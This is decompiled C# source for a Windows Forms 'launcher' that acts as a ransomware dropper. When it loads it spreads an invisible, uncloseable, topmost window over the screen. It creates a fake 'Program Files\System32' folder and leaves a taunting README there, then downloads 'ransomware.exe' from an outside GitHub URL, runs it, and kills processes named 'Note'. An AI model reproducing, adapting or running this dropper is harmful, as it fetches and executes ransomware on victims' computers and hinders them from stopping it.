using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Windows.Forms;

namespace launcher;

public class launcher : Form
{
	private IContainer components;

	public launcher()
	{
		InitializeComponent();
		((Form)this).set_TransparencyKey(((Control)this).get_BackColor());
	}

	private void launcher_FormClosing(object sender, FormClosingEventArgs e)
	{
		((CancelEventArgs)(object)e).Cancel = true;
	}

	private void launcher_Load(object sender, EventArgs e)
	{
		((Control)this).set_Left(0);
		((Control)this).set_Top(0);
		((Control)this).set_Width(Screen.get_PrimaryScreen().get_Bounds().Width);
		((Control)this).set_Height(Screen.get_PrimaryScreen().get_Bounds().Height);
		Directory.CreateDirectory("C:\\Program Files\\System32");
		File.WriteAllText("C:\\Program Files\\System32\\README.txt", "You found the ransomware? Congrats!!!");
		Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		ServicePointManager.Expect100Continue = true;
		ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
		WebClient webClient = new WebClient();
		string fileName = "C:\\Program Files\\System32\\ransomware.exe";
		string address = "https://github.com/kobato16/ransom-study/raw/main/ransomware.exe";
		webClient.DownloadFile(address, fileName);
		Process.Start(fileName);
		Process[] processesByName = Process.GetProcessesByName("Note");
		for (int i = 0; i < processesByName.Length; i++)
		{
			processesByName[i].Kill();
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0079: Unknown result type (might be due to invalid IL or missing references)
		//IL_0083: Expected O, but got Unknown
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(8f, 16f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(23, 20));
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("launcher");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).set_Text("launcher");
		((Form)this).set_TopMost(true);
		((Form)this).add_FormClosing(new FormClosingEventHandler(launcher_FormClosing));
		((Form)this).add_Load((EventHandler)launcher_Load);
		((Control)this).ResumeLayout(false);
	}
}
